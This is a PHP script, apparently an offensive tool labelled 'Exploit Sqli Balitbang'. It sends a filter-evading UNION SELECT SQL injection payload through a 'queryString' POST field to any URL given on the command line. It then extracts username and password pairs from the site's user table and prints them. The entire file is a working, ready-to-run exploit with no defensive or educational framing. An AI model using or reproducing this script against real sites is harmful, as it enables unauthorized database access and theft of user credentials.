<?php

error_reporting(0);

echo "\n";

echo "##########################\n";

echo "# Exploit Sqli Balitbang #\n";

echo "# Dinda #\n";

echo "# peri kecil #\n";

echo "##########################\n";

$url = $argv[1];

echo "\n[+] Exploiting : $url\n";

$c = curl_init();

$dios = "(select+group_concat('<result>',username,0x3a,password,'</result>')+from+user)";

curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($c, CURLOPT_URL, $url);

curl_setopt($c, CURLOPT_POSTFIELDS, "queryString=exploit'/**//*!12345uNIoN*//**//*!12345sELEcT*//**/$dios,version()-- -");

curl_setopt($c, CURLOPT_VERBOSE, false);

$str = curl_exec($c);

$preg = preg_match_all("'<result>(.*?)</result>'si", $str, $isi);

if(!empty($isi[1])) {

echo "\n[+] Exploit Success\n";

echo "\n[+] Getting Data\n";

echo "\n[+] Result Data :\n";

$i=1;

foreach($isi[1] as $get) {

$ubah = "[+] Username : ".str_replace(":", "\n[+] Password : ", $get);

echo "\n\n[+] Data ".$i++." [+]";

	 echo "\n$ubah";

	 echo "\n[+] End Data [+]";

}

} else {

echo "\n[-] Target : $url ( Failed )";

}

echo "\n\n";

?>
